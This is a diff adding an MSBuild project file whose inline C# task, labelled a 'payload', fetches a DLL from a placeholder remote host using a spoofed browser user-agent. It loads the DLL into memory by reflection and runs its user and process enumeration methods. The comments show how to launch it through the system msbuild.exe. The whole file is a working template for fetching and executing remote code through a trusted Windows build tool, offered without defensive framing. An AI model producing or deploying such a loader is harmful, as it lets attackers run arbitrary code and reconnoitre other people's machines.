@@ -1,0 +1,53 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml -->
+  <Target Name="Calc">
+    <MyLauncher>
+    </MyLauncher>
+  </Target>
+  <UsingTask
+    TaskName="MyLauncher"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Using Namespace="System.Net" />
+      <Using Namespace="System.Reflection" />
+
+      <Using Namespace="System.Collections.Generic" />
+      <Using Namespace="System.Linq" />
+      <Using Namespace="System.Text" />
+      <Using Namespace="System.Threading.Tasks" />
+      <Using Namespace="System.Management" />
+      <Using Namespace="System.Diagnostics" />
+
+      <Code Type="Fragment" Language="cs">
+      <![CDATA[
+        // C# payload here
+
+            var wc = new WebClient();
+            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
+            var a = Assembly.Load(wc.DownloadData("http://x.x.x.x/SharpEnumLibrary.dll"));
+
+
+          var t = a.GetType("SharpEnumLibrary.DoEnum");
+            var c = Activator.CreateInstance(t);
+
+            // Execute GetUsers
+            var m = t.GetMethod("GetUsers");
+            var output = (String)m.Invoke(c, null);
+
+            // Execute GetRunningProcesses
+            m = t.GetMethod("GetRunningProcesses");
+            output += "\n"+ (String)m.Invoke(c, null);
+
+            // Pause for input
+            Console.WriteLine(output);
+
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
